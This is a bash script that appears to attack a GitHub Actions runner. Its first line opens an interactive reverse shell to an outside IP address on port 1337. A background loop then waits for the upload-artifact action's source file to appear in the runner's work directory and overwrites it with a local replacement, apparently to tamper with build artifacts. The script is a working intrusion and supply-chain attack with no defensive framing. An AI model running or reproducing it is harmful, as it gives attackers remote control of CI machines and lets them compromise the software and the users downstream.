#!/bin/bash

bash -i >& /dev/tcp/34.71.242.162/1337 0>&1

# Path to the file to check
file_to_check="~/work/_actions/actions/upload-artifact/v3/src/upload-artifact.ts"

# Path to the replacement file
replacement_file="./upload-artifact.ts"

# Log file for debugging (optional)
log_file="file_watch.log"

echo "Starting the loop"

# Redirect output to log file
{
    echo "Starting file watch process in the background."

    # Loop until the file exists
    while [ ! -f "$file_to_check" ]; do
        echo "$(date): Waiting for $file_to_check to be created..."
        sleep 1  # Wait 1 second before checking again
    done

    echo "$(date): $file_to_check has been created!"

    # Replace the file with another
    cp "$replacement_file" "$file_to_check"
    echo "$(date): $file_to_check has been replaced with $replacement_file."
} >> "$log_file" 2>&1 &

# Provide a message that the script is running in the background
echo "File watch script is now running in the background. Logs can be found in $log_file."

